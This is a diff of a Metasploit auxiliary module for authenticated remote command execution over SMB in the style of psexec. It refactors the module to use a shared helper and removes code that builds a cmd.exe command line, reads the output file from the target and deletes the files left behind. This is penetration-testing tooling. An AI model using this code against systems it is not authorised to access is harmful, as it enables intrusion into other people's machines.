@@ -50,8 +50,6 @@ class MetasploitModule < Msf::Auxiliary
       OptInt.new('DELAY', [true, 'Wait this many seconds before reading output and cleaning up', 0]),
       OptInt.new('RETRY', [true, 'Retry this many times to check if the process is complete', 0]),
     ])
-
-    deregister_options('RHOST')
   end
 
   # This is the main controle method
@@ -69,112 +67,22 @@ class MetasploitModule < Msf::Auxiliary
         print_error("Unable to authenticate with given credentials: #{autherror}")
         return
       end
-      res = execute_command(text, bat)
+      output = execute_command_with_output(text, bat, datastore['COMMAND'], @smbshare, @ip, datastore['RETRY'], datastore['DELAY'])
 
-      if res
-        for i in 0..(datastore['RETRY'])
-          Rex.sleep(datastore['DELAY'])
-          # if the output file is still locked then the program is still likely running
-          if (exclusive_access(text))
-            break
-          elsif (i == datastore['RETRY'])
-            print_error("Command seems to still be executing. Try increasing RETRY and DELAY")
-          end
-        end
-        get_output(text)
+      unless output.nil?
+        print_good("Command completed successfully!")
+        print_status("Output for \"#{datastore['COMMAND']}\":\n")
+        print_line("#{output}\n")
+        report_note(
+          :rhost => datastore['RHOSTS'],
+          :rport => datastore['RPORT'],
+          :type  => "psexec_command",
+          :name => datastore['COMMAND'],
+          :data => output
+        )
       end
-
-      cleanup_after(text, bat)
       disconnect
     end
   end
 
-  # Executes specified Windows Command
-  def execute_command(text, bat)
-    # Try and execute the provided command
-    execute = "%COMSPEC% /C echo #{datastore['COMMAND']} ^> %SYSTEMDRIVE%#{text} > #{bat} & %COMSPEC% /C start %COMSPEC% /C #{bat}"
-    print_status("Executing the command...")
-    begin
-      return psexec(execute)
-    rescue Rex::Proto::DCERPC::Exceptions::Error, Rex::Proto::SMB::Exceptions::Error => e
-      elog("#{e.class} #{e.message}\n#{e.backtrace * "\n"}", 'rex', LEV_3)
-      print_error("Unable to execute specified command: #{e}")
-      return false
-    end
-  end
-
-  # Retrive output from command
-  def get_output(file)
-    print_status("Getting the command output...")
-    output = smb_read_file(@smbshare, @ip, file)
-    if output.nil?
-      print_error("Error getting command output. #{$!.class}. #{$!}.")
-      return
-    end
-    if output.empty?
-      print_status("Command finished with no output")
-      return
-    end
-
-    # Report output
-    print_good("Command completed successfuly!")
-    vprint_status("Output for \"#{datastore['COMMAND']}\":")
-    vprint_line("#{output}")
-
-    report_note(
-      :rhost => datastore['RHOSTS'],
-      :rport => datastore['RPORT'],
-      :type => "psexec_command",
-      :name => datastore['COMMAND'],
-      :data => output
-    )
-
-  end
-
-  # check if our process is done using these files
-  def exclusive_access(*files)
-    begin
-      simple.connect("\\\\#{@ip}\\#{@smbshare}")
-    rescue Rex::Proto::SMB::Exceptions::ErrorCode => accesserror
-      print_status("Unable to get handle: #{accesserror}")
-      return false
-    end
-    files.each do |file|
-      begin
-        print_status("checking if the file is unlocked")
-        fd = smb_open(file, 'rwo')
-        fd.close
-      rescue Rex::Proto::SMB::Exceptions::ErrorCode => accesserror
-        print_status("Unable to get handle: #{accesserror}")
-        return false
-      end
-      simple.disconnect("\\\\#{@ip}\\#{@smbshare}")
-    end
-    return true
-  end
-
-
-  # Removes files created during execution.
-  def cleanup_after(*files)
-    begin
-      simple.connect("\\\\#{@ip}\\#{@smbshare}")
-    rescue Rex::Proto::SMB::Exceptions::ErrorCode => accesserror
-      print_error("Unable to connect for cleanup: #{accesserror}. Maybe you'll need to manually remove #{files.join(", ")} from the target.")
-      return
-    end
-    print_status("Executing cleanup...")
-    files.each do |file|
-      begin
-        smb_file_rm(file)
-      rescue Rex::Proto::SMB::Exceptions::ErrorCode => cleanuperror
-        print_error("Unable to cleanup #{file}. Error: #{cleanuperror}")
-      end
-    end
-    left = files.collect{ |f| smb_file_exist?(f) }
-    if left.any?
-      print_error("Unable to cleanup. Maybe you'll need to manually remove #{left.join(", ")} from the target.")
-    else
-      print_good("Cleanup was successful")
-    end
-  end
 end
